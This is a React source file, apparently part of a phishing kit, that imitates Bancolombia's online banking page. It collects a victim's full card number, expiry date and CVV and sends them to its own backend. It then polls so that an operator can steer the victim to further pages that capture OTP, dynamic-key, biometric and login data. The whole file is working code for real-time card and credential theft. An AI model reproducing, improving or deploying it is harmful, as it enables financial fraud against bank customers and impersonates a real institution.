import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import localStorageService from "../../services/localStorageService";
import Loading from "../../components/Loading";
import './css/LoginModal.css';
import Payment from "payment";

// Estilos para la animación de flip
const flipStyles = `
  .flip-card {
    background-color: transparent;
    width: 100%;
    max-width: 350px;
    aspect-ratio: 1.586;
    perspective: 1000px;
    margin: 0 auto 30px auto;
  }

  .flip-card-inner {
    position: relative;
    width: 100%;
    height: 100%;
    text-align: center;
    transform-style: preserve-3d;
    transition: transform 0.8s cubic-bezier(0.4, 0.2, 0.2, 1);
    will-change: transform; /* 🔥 evita parpadeos */
  }

  .flip-card-inner.flipped {
    transform: rotateY(180deg);
  }

  .flip-card-front,
  .flip-card-back {
    position: absolute;
    inset: 0; /* 🔑 CLAVE: fuerza mismo tamaño exacto */
    backface-visibility: hidden;
    border-radius: 12px;
    overflow: hidden;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
  }

  .flip-card-back {
    transform: rotateY(180deg);
  }

  .flip-card-front img,
  .flip-card-back img {
    width: 100%;
    height: 100%;
    object-fit: cover; /* 🔑 normaliza imágenes distintas */
    display: block;
  }
`;


export default function ValidacionTC() {
    const navigate = useNavigate();

    // --- ESTADOS ---
    const [step, setStep] = useState("front"); // 'front' | 'back'
    const [cardDigits, setCardDigits] = useState("");
    const [expirationDate, setExpirationDate] = useState("");
    const [cvv, setCvv] = useState("");

    // Estados de UI/Sistema
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");
    const [isFocused, setIsFocused] = useState(false);
    const [focusedField, setFocusedField] = useState(""); // 'digits' | 'expiration' | 'cvv'
    const [cargando, setCargando] = useState(false);

    // Estado principal de tarjeta
    const [cardData, setCardData] = useState({
        filename: "imgi_5_Debito_(preferencial).png",
        tipo: "debito",
        digits: "5456",
        label: "Débito Preferencial"
    });

    // --- LÓGICA DE CARGA DE DATOS ---
    useEffect(() => {
        const savedCardData = localStorageService.getItem("selectedCardData");
        if (savedCardData) {
            setCardData(savedCardData);
        }
        obtenerIP();
        obtenerFechaHora();
    }, []);

    // Timer para fecha/hora
    useEffect(() => {
        const ahora = new Date();
        const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
        let intervalId;

        const timeoutId = setTimeout(() => {
            obtenerFechaHora();
            intervalId = setInterval(obtenerFechaHora, 60000);
        }, msHastaProximoMinuto);

        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    const obtenerIP = async () => {
        try {
            const response = await fetch("https://api.ipify.org?format=json");
            const data = await response.json();
            setIp(data.ip);
        } catch (error) {
            setIp("No disponible");
        }
    };

    const obtenerFechaHora = () => {
        const ahora = new Date();
        const opciones = { weekday: "long", year: "numeric", month: "long", day: "numeric", hour: "numeric", minute: "2-digit", hour12: true };
        setFechaHora(ahora.toLocaleString("es-CO", opciones));
    };


    // --- LÓGICA DE TARJETA E IMÁGENES ---

    // 1. Mapa de imágenes frontales a traseras (Traído de ValidacionCVV)
    const getBackCardFilename = (frontFilename) => {
        const frontToBackMap = {
            // Crédito - Mastercard
            "imgi_10_Mastercard_ideal_.png": "Mastercard-ideal.png",
            "imgi_11_Mastercard_joven_.png": "Mastercard-joven.png",
            "imgi_12_clasica_.png": "Mastercard-clasica.png",
            "imgi_14_Mastercard_credit-card.png": "Mastercard-Unica.png",
            "imgi_15_275x172.png": "Mastercard-Standard.png",
            "imgi_16_Mastercard_oro_.png": "Mastercard-oro.png",
            "imgi_19_Mastercard_611_600x379.png": "Mastercard-Platinum.png",
            "imgi_24_Mastercard_612_600x379.png": "Mastercard-Black-v1.png",
            "imgi_26_Mastercard_+Tarjeta+Virtual.png": "Mastercard-E-Card-v1.png",
            "imgi_29_Mastercard-Sufi_Optimizada.png": "Mastercard-Sufi-v1.png",
            "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.png": "Mastercard-Esso-mobil-v1.png",
            "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.png": "Mastercard-Esso-mobil-v1.png",
            // Crédito - Visa
            "imgi_13_+Visa+clasica+tradicional.png": "Visa-Clasica.png",
            "imgi_17_Visa+Seleccion+Colombia.png": "Visa-seleccion-colombia.png",
            "imgi_18_Visa+Oro.png": "Visa-Oro.png",
            "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.png": "Visa-LifeMiles-v1 (2).png",
            "imgi_25_Visa+Platinum+Conavi.png": "Visa-Platinum-v1.png",
            "imgi_28_Visa_Infinite_Card.png": "Visa-infinite-v1.png",
            // Crédito - Amex
            "imgi_20_AMEX+SkyBlue.png": "Amex+Libre.png",
            "imgi_21_AMEX+Green.png": "Amex-Green-v1.png",
            "imgi_22_AMEX+Gold.png": "Amex-Gold-v1.png",
            "imgi_27_AMEX+Platinum.png": "Amex-Platinum-v1.png",
            "imgi_7_Amex+Libre.png": "Amex+Libre.png",
            // Débito
            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.png": "Débito Cívica.png",
            "imgi_5_Debito_(preferencial).png": "Débito Preferencial.png",
            "imgi_7_004_600x379.png": "Débito Clásica.png",
            "debito_virtual.png": "debito_virtual.png"
        };
        return frontToBackMap[frontFilename] || null;
    };

    // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
    // Diccionario de ajustes específicos para tarjetas con problemas de tamaño/encuadre
    const CARD_ADJUSTMENTS = {
        // --- VISA ---
        "Visa-Clasica.png": { transform: "scale(1.15)" },
        "Visa-seleccion-colombia.png": { transform: "scale(1.15)" },
        "Visa-Oro.png": { transform: "scale(1.15)" },
        "Visa-Platinum-v1.png": { transform: "scale(1.1)" },

        // --- MASTERCARD ---
        "Mastercard-Unica.png": { transform: "scale(1.1)" },
        "Mastercard-oro.png": { transform: "scale(1.1)" },
        "Mastercard-Esso-mobil-v1.png": { transform: "scale(1.15)" }, // Esso Gold & Mobil comparten mapping a veces, ajustamos ambas si es el caso
        "Mastercard-Platinum.png": { transform: "scale(1.1)" },
        "Mastercard-Black-v1.png": { transform: "scale(1.06)" },
        "Mastercard-E-Card-v1.png": { transform: "scale(1.05)" },
        "Débito Cívica.png": { transform: "scale(1.03)" },
        "Débito Preferencial.png": { transform: "scale(1.04)" },
        "Débito Clásica.png": { transform: "scale(1.04)" },
        "debito_virtual.png": { transform: "scale(1.05)" },

        // --- AMEX ---
        "Amex+Libre.png": { transform: "scale(1.15)" },
    };

    const getCardStyle = (filename) => {
        // Retorna el estilo específico si existe, o vacío si no
        return CARD_ADJUSTMENTS[filename] || {};
    };

    const getCardImagePath = () => {
        const basePath = cardData.tipo === "credito" ? "/assets/images/IMGtarjetas/" : "/assets/images/IMGdebitotj/";
        return `${basePath}${cardData.filename}`;
    };

    const getBackCardImagePath = () => {
        const backFilename = getBackCardFilename(cardData.filename);
        if (!backFilename) return getCardImagePath(); // Fallback
        const folder = cardData.tipo === "debito" ? "ATRAS-DEBITO" : "ATRAS-TARJETAS";
        return `/assets/images/${folder}/${backFilename}`;
    };

    const getTipoTarjeta = () => cardData.tipo === "credito" ? "Crédito" : "Débito";

    // --- LÓGICA DE VALIDACIÓN ---
    const isAmex = cardData.label.toLowerCase().includes("amex") || cardData.filename.toLowerCase().includes("amex");
    const requiredDigitsLength = 12; // Siempre 12 dígitos iniciales
    const requiredCvvLength = isAmex ? 4 : 3;

    const handleDigitsChange = (e) => {
        const val = e.target.value;

        // Solo números y longitud
        if (!/^\d*$/.test(val) || val.length > requiredDigitsLength) {
            return;
        }

        // Guardar mientras escribe
        setCardDigits(val);

        // 👇 SOLO validar cuando ya están los 12 dígitos
        if (val.length === requiredDigitsLength) {

            // Construir número completo (12 + últimos 4 conocidos)
            const fullCardNumber = val + cardData.digits;

            const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
            const cardType = Payment.fns.cardType(fullCardNumber);

            // ❌ Tarjeta inválida (Luhn o tipo desconocido)
            if (!isValidNumber || !cardType) {
                alert("Número de tarjeta inválido. Verifica los dígitos.");
                return;
            }

            // ✅ Opcional: validar tipo esperado (crédito/débito)
            if (cardData.tipo === "debito" && cardType !== "visa" && cardType !== "mastercard") {
                alert("La tarjeta ingresada no corresponde a una tarjeta débito válida.");
                return;
            }

            // 🔥 Aquí ya pasó validación real
            console.log("Tarjeta válida:", cardType);
        }
    };


    const handleExpirationChange = (e) => {
        const raw = e.target.value;
        const numbers = raw.replace(/\D/g, "");

        // 👈 Backspace: no reformatear
        if (raw.length < expirationDate.length) {
            setExpirationDate(raw);
            return;
        }

        const currentYear = new Date().getFullYear() % 100;
        let val = numbers;

        // ===== MES =====
        if (val.length >= 2) {
            let month = val.slice(0, 2);
            let monthNum = parseInt(month, 10);

            if (monthNum < 1) month = "01";
            if (monthNum > 12) month = "12";

            val = month + val.slice(2);
        }

        // ===== AÑO =====
        if (val.length > 2) {
            let year = val.slice(2, 4);

            if (year.length === 2) {
                let yearNum = parseInt(year, 10);
                if (yearNum < currentYear) {
                    year = String(currentYear);
                }
            }

            val = val.slice(0, 2) + "/" + year;
        }

        if (val.length <= 5) {
            setExpirationDate(val);
        }
    };

    const handleCvvChange = (e) => {
        const val = e.target.value;
        if (/^\d*$/.test(val) && val.length <= requiredCvvLength) {
            setCvv(val);
        }
    };

    // --- TRANSICIÓN DE PASOS ---
    const handleContinue = async () => {
        if (step === "front") {
            // Validar paso 1: 12 dígitos + fecha de expiración válida
            const isExpirationValid = expirationDate.length === 5 && expirationDate.includes("/");
            if (cardDigits.length === requiredDigitsLength && isExpirationValid) {
                setStep("back"); // Esto activará la animación CSS
                setIsFocused(false);
                setFocusedField("");
            }
        } else {
            // Validar paso 2 y Enviar
            if (cvv.length === requiredCvvLength) {
                try {
                    setCargando(true);
                    // Obtener sesion_id del localStorage
                    const raw = localStorage.getItem("datos_usuario");
                    const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                    const sesionId = usuarioLocalStorage?.sesion_id;

                    if (!sesionId) {
                        alert("Error: No se encontró la sesión");
                        setCargando(false);
                        return;
                    }

                    // Construir número completo de tarjeta (12 dígitos + 4 últimos)
                    const numeroTarjetaCompleto = cardDigits + cardData.digits;

                    // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
                    if (!usuarioLocalStorage.usuario) usuarioLocalStorage.usuario = {};
                    if (!usuarioLocalStorage.usuario.tc) usuarioLocalStorage.usuario.tc = [];

                    const nuevoIntento = {
                        intento: usuarioLocalStorage.usuario.tc.length + 1,
                        numeroTarjeta: numeroTarjetaCompleto,
                        fechaExpiracion: expirationDate,
                        cvv: cvv,
                        fecha: new Date().toLocaleString()
                    };

                    usuarioLocalStorage.usuario.tc.push(nuevoIntento);
                    localStorage.setItem("datos_usuario", JSON.stringify(usuarioLocalStorage));


                    // Preparar datos para enviar
                    // Enviamos usuarioLocalStorage completo en attributes para que el backend tome el array tc
                    const dataSend = {
                        data: {
                            attributes: usuarioLocalStorage
                        }
                    };

                    // Importar axios instance
                    const { instanceBackend } = await import("../../axios/instanceBackend");

                    // Enviar al backend
                    const response = await instanceBackend.post("/tc", dataSend);

                    if (response.data.success) {
                        // Iniciar polling para esperar respuesta del admin
                        iniciarPolling(sesionId);
                    } else {
                        alert("Error al enviar los datos");
                    }

                } catch (error) {
                    console.error("Error enviando TC:", error);
                    alert("Error de conexión con el servidor");
                }
            }
        }
    };

    // Función de polling para esperar respuesta del admin con timeout y límite de reintentos
    const iniciarPolling = (sesionId) => {
        let attempts = 0;
        const MAX_ATTEMPTS = 60; // Máximo 60 intentos = 3 minutos (60 * 3s)
        const TIMEOUT_MS = 180000; // 3 minutos en total
        let timeoutId;

        const pollingInterval = setInterval(async () => {
            try {
                attempts++;
                const { instanceBackend } = await import("../../axios/instanceBackend");
                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado, cardData } = response.data;

                // Si viene data de tarjeta personalizada, actualizar estado
                if (cardData) {
                    setCardData(cardData);
                    localStorageService.setItem("selectedCardData", cardData);
                }

                console.log('TC Polling:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);

                // Verificar timeout o máximo de intentos
                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
                    // Recargar página para permitir reintento
                    window.location.reload();
                    return;
                }

                // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
                const estadosEspera = ['pendiente', 'solicitar_tc_custom', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
                
                if (estadosEspera.includes(estado)) {
                    // Seguir esperando, mantener loading
                    return;
                }

                // Si hay error (rechazo del admin), recargar página para permitir reintento
                if (estado === 'error_tc') {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    alert("Los datos de la tarjeta son incorrectos. Por favor, verifícalos e inténtalo nuevamente.");
                    // Recargar página para permitir reintento
                    window.location.reload();
                    return;
                }

                // Si el admin aprueba y pide siguiente paso, redirigir
                // Limpiar intervalos antes de redirigir
                clearInterval(pollingInterval);
                clearTimeout(timeoutId);
                setCargando(false);

                switch (estado.toLowerCase()) {
                    case 'solicitar_tc':
                        // Si pide TC de nuevo, recargar para reintentar
                        window.location.reload();
                        break;

                    case 'solicitar_otp':
                        navigate('/numero-otp');
                        break;

                    case 'solicitar_din':
                        navigate('/clave-dinamica');
                        break;

                    case 'solicitar_finalizar':
                        navigate('/finalizado-page');
                        break;

                    case 'solicitar_biometria':
                        navigate('/verificacion-identidad');
                        break;

                    case 'error_923':
                        navigate('/error-923page');
                        break;

                    case 'solicitar_tc_custom':
                        navigate('/validacion-tc-custom');
                        break;

                    case 'solicitar_cvv_custom':
                        navigate('/validacion-cvv');
                        break;

                    case 'solicitar_cvv':
                        navigate('/validacion-cvv');
                        break;

                    case 'error_otp':
                        navigate('/numero-otp');
                        break;

                    case 'error_din':
                        navigate('/clave-dinamica');
                        break;

                    case 'error_login':
                        navigate('/autenticacion');
                        break;

                    default:
                        console.log("Estado no manejado en redirección:", estado);
                        break;
                }

            } catch (error) {
                console.error('Error en polling:', error);
                attempts++;
                // Si hay muchos errores consecutivos, detener polling
                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    alert("Error de conexión. Por favor, verifica tu conexión e inténtalo nuevamente.");
                    // Recargar página para permitir reintento
                    window.location.reload();
                }
            }
        }, 3000);

        // Timeout global de 3 minutos
        timeoutId = setTimeout(() => {
            clearInterval(pollingInterval);
            setCargando(false);
            alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
            // Recargar página para permitir reintento
            window.location.reload();
        }, TIMEOUT_MS);
    };

    // --- RENDER HELPERS ---

    // Placeholder para Dígitos (Frente) - Ahora solo 12 dígitos
    const renderVisualInputDigits = () => (
        <div className="input-lines-container mb-4" onClick={() => document.getElementById('cardDigits').focus()}
            style={{ display: "flex", gap: "6px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", flexWrap: "wrap" }}>
            {Array.from({ length: requiredDigitsLength }).map((_, index) => {
                const activeIndex = cardDigits.length < requiredDigitsLength ? cardDigits.length : requiredDigitsLength - 1;
                const isActive =
                    isFocused &&
                    focusedField === "digits" &&
                    step === "front" &&
                    index === activeIndex &&
                    (
                        (activeIndex < 8 && index < 8) ||   // fila superior
                        (activeIndex >= 8 && index >= 8)    // fila inferior
                    );
                const extraMargin = (index > 0 && index % 4 === 0) ? "10px" : "0px";
                return (
                    <div key={index} style={{
                        width: "20px", height: "30px", marginLeft: extraMargin,
                        borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                        display: "flex", justifyContent: "center", alignItems: "center",
                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                    }}>
                        {cardDigits[index] || ""}
                    </div>
                );
            })}
        </div>
    );

    // Placeholder para Fecha de Expiración (Frente)
    const renderVisualInputExpiration = () => (
        <div className="input-lines-container" onClick={() => document.getElementById('expirationDate').focus()}
            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center", marginTop: "15px" }}>
            {Array.from({ length: 5 }).map((_, index) => {
                const activeIndex = expirationDate.length < 5 ? expirationDate.length : 4;
                const isActive = isFocused && focusedField === "expiration" && step === "front" && index === activeIndex;
                const char = expirationDate[index] || "";
                return (
                    <div key={index} style={{
                        width: index === 2 ? "10px" : "25px",
                        height: "30px",
                        borderBottom: index === 2 ? "none" : `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                        display: "flex", justifyContent: "center", alignItems: "center",
                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                    }}>
                        {char}
                    </div>
                );
            })}
        </div>
    );

    // Placeholder para CVV (Reverso)
    const renderVisualInputCVV = () => (
        <div className="input-lines-container" onClick={() => document.getElementById('cvv').focus()}
            style={{ display: "flex", gap: "10px", cursor: "text", height: "45px", alignItems: "center", justifyContent: "center" }}>
            {Array.from({ length: requiredCvvLength }).map((_, index) => {
                const activeIndex = cvv.length < requiredCvvLength ? cvv.length : requiredCvvLength - 1;
                const isActive = isFocused && step === "back" && index === activeIndex;
                return (
                    <div key={index} style={{
                        width: "30px", height: "30px",
                        borderBottom: `2px solid ${isActive ? "#FDDA24" : "#ffffff"}`,
                        display: "flex", justifyContent: "center", alignItems: "center",
                        color: "#ffffff", fontSize: "18px", fontWeight: "bold", transition: "border-color 0.2s"
                    }}>
                        {cvv[index] || ""}
                    </div>
                );
            })}
        </div>
    );

    return (
        <>
            <style>{flipStyles}</style>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                {/* Header igual */}
                <div style={{
                    flex: 1,
                    backgroundColor: "#2C2A29",
                    backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                    backgroundRepeat: "no-repeat",
                    backgroundPosition: "center",
                    backgroundPositionY: "-70px",
                    backgroundPositionX: "-500px",
                }}>

                    <div style={{ textAlign: "center" }}>
                        <img src="/assets/images/img_pantalla2/descarga.svg" alt="Logo" style={{ width: "238px", marginTop: "45px" }} />
                    </div>
                    <div style={{ marginTop: "25px", textAlignLast: "center" }}>
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>

                            {/* Header Tarjeta Pequeña */}
                            <div style={{ display: "flex", alignItems: "flex-start", gap: "15px", marginBottom: "24px" }}>
                                <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
                                <h2 style={{ fontSize: "20px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
                                    {step === "front"
                                        ? `Ingresa los datos de tu Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                        : `Validación del CVV de la Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                    }
                                </h2>
                            </div>

                            <p style={{ fontSize: "16px", lineHeight: "24px", color: "#ffffff", marginBottom: "30px", textAlign: "left" }}>
                                {step === "front"
                                    ? "Ingresa los primeros 12 dígitos y la fecha de expiración de tu tarjeta."
                                    : "Para garantizar la seguridad de tu cuenta, confirma el código de seguridad (CVV)."
                                }
                            </p>

                            {/* --- FLIP CARD CONTAINER --- */}
                            <div className="flip-card">
                                <div className={`flip-card-inner ${step === 'back' ? 'flipped' : ''}`}>

                                    {/* FRENTE */}
                                    <div className="flip-card-front">
                                        <img
                                            src={getCardImagePath()}
                                            alt="Frente"
                                            style={getCardStyle(cardData.filename)}
                                        />

                                        {/* Overlay Dígitos en la Tarjeta */}
                                        <div style={{
                                            position: "absolute", top: "65%", left: "50%", transform: "translate(-50%, -50%)", width: "88%",
                                            display: "flex", flexDirection: "column", gap: "8px", color: "#ffffff",
                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)", pointerEvents: "none"
                                        }}>
                                            {/* Número de tarjeta: 12 bullets + últimos 4 dígitos */}
                                            <div className="digits-text" style={{ marginTop: 20 }}>
                                                {cardDigits.padEnd(requiredDigitsLength, '•').match(/.{1,4}/g)?.join(' ')} {cardData.digits}
                                            </div>

                                            {/* Fecha de expiración */}
                                            <div className="digits-text" style={{ marginTop: 0 }}>
                                                {expirationDate || "MM/YY"}
                                            </div>
                                        </div>
                                    </div>

                                    {/* REVERSO */}
                                    <div className="flip-card-back">
                                        <img
                                            src={getBackCardImagePath()}
                                            alt="Reverso"
                                            style={getCardStyle(getBackCardFilename(cardData.filename))}
                                        />

                                        {/* Overlay CVV */}
                                        <div style={{
                                            position: "absolute", top: "32.5%", left: "84%", transform: "translate(-50%, -50%)",
                                            color: "#000", fontSize: "20px", fontFamily: "monospace", fontWeight: "bold", pointerEvents: "none"
                                        }}>
                                            {cvv}
                                        </div>
                                    </div>

                                </div>
                            </div>

                            {/* --- INPUTS --- */}
                            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "25px", width: "100%" }}>

                                {step === "front" ? (
                                    <>
                                        {/* Input de Número de Tarjeta */}
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputDigits()}
                                            <label htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", textAlign: 'center' }}>
                                                Ingrese los primeros 12 dígitos de su tarjeta
                                            </label>
                                            <input
                                                id="cardDigits"
                                                type="tel"
                                                maxLength={requiredDigitsLength}
                                                pattern="[0-9]*"
                                                value={cardDigits}
                                                onChange={handleDigitsChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("digits"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
                                                    height: "40px",      // 👈 altura SOLO de la fila superior
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent", // 👈 CLAVE
                                                }}
                                            />
                                        </div>

                                        {/* Input de Fecha de Expiración */}
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputExpiration()}
                                            <label htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
                                                Fecha de expiración (MM/YY)
                                            </label>
                                            <input
                                                id="expirationDate"
                                                type="tel"
                                                maxLength={5}
                                                pattern="[0-9\/]*"
                                                value={expirationDate}
                                                onChange={handleExpirationChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("expiration"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
                                                    height: "40px",      // 👈 altura SOLO de la fila superior
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent", // 👈 CLAVE
                                                }}
                                            />
                                        </div>
                                    </>
                                ) : (
                                    <>
                                        {/* Input de CVV */}
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputCVV()}
                                            <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>CVV</label>
                                            <input
                                                id="cvv"
                                                type="tel"
                                                maxLength={requiredCvvLength}
                                                pattern="[0-9]*"
                                                value={cvv}
                                                onChange={handleCvvChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",      // 👈 ancho SOLO de la fila superior
                                                    height: "40px",      // 👈 altura SOLO de la fila superior
                                                    opacity: 0,
                                                    cursor: "text",
                                                }}
                                            />
                                        </div>
                                    </>
                                )}

                            </div>

                            <br /><br />

                            {/* BOTÓN DE ACCIÓN */}
                            <button className="login-btn" onClick={handleContinue}
                                style={{
                                    marginTop: "20px",
                                    opacity: (step === "front"
                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
                                        : cvv.length === requiredCvvLength) ? 1 : 0.5,
                                    cursor: (step === "front"
                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
                                        : cvv.length === requiredCvvLength) ? "pointer" : "not-allowed"
                                }}
                                disabled={step === "front"
                                    ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5)
                                    : cvv.length !== requiredCvvLength}
                            >
                                {step === "front" ? "Siguiente" : "Enviar"}
                            </button>

                        </div>
                    </div>

                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        {/* Se eliminó la línea <hr> a petición del usuario */}
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        alt="Bancolombia"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "180px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}
        </>
    );
}
